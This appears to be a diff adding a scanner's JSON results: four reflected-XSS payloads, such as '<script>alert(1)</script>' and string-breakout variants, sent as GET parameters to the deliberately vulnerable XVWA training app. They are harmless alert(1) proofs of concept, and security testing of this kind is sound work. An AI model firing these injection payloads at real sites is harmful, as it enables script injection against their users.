@@ -1,0 +1,22 @@
+[
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=121%3Balert%281%29%2F%2F678",
+        "method": "GET",
+        "data": "{'item': '121;alert(1)//678'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=gb44d%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3Eaxm7cgi45yi",
+        "method": "GET",
+        "data": "{'item': 'gb44d><script>alert(1)</script>axm7cgi45yi'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=12126%26apos%3B%3Balert%281%29%2F%2F678",
+        "method": "GET",
+        "data": "{'item': '12126&apos;;alert(1)//678'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=pebma%22-alert%281%29-%22t17n0",
+        "method": "GET",
+        "data": "{'item': 'pebma\"-alert(1)-\"t17n0'}"
+    }
+]
